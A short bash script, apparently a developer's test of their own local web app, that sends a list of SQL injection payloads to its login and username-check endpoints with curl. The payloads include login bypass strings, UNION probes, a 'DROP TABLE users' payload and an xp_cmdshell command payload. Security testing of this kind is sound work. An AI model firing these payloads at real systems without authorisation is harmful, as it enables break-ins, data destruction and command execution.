#!/bin/bash

BASE_URL="http://localhost:3000"

echo "=== Testing SQL Injection Vulnerabilities ==="

# Array of SQL injection payloads
payloads=(
    "' OR '1'='1"
    "' OR '1'='1' --"
    "' OR '1'='1' /*"
    "admin'--"
    "' UNION SELECT NULL--"
    "' AND 1=1--"
    "' AND 1=2--"
    "1' ORDER BY 1--"
    "' DROP TABLE users--"
    "'; EXEC xp_cmdshell('dir')--"
)

echo -e "\n[*] Testing Login Endpoint"
for payload in "${payloads[@]}"; do
    echo "Testing: $payload"
    curl -s -X POST "$BASE_URL/auth/login" \
      -H "Content-Type: application/json" \
      -d "{\"login\":\"$payload\",\"password\":\"test\"}" | jq .
    sleep 1
done

echo -e "\n[*] Testing Username Check"
for payload in "${payloads[@]}"; do
    echo "Testing: $payload"
    curl -s "$BASE_URL/check-username?username=$(echo $payload | jq -sRr @uri)" | jq .
    sleep 1
done

echo -e "\n=== Testing Complete ==="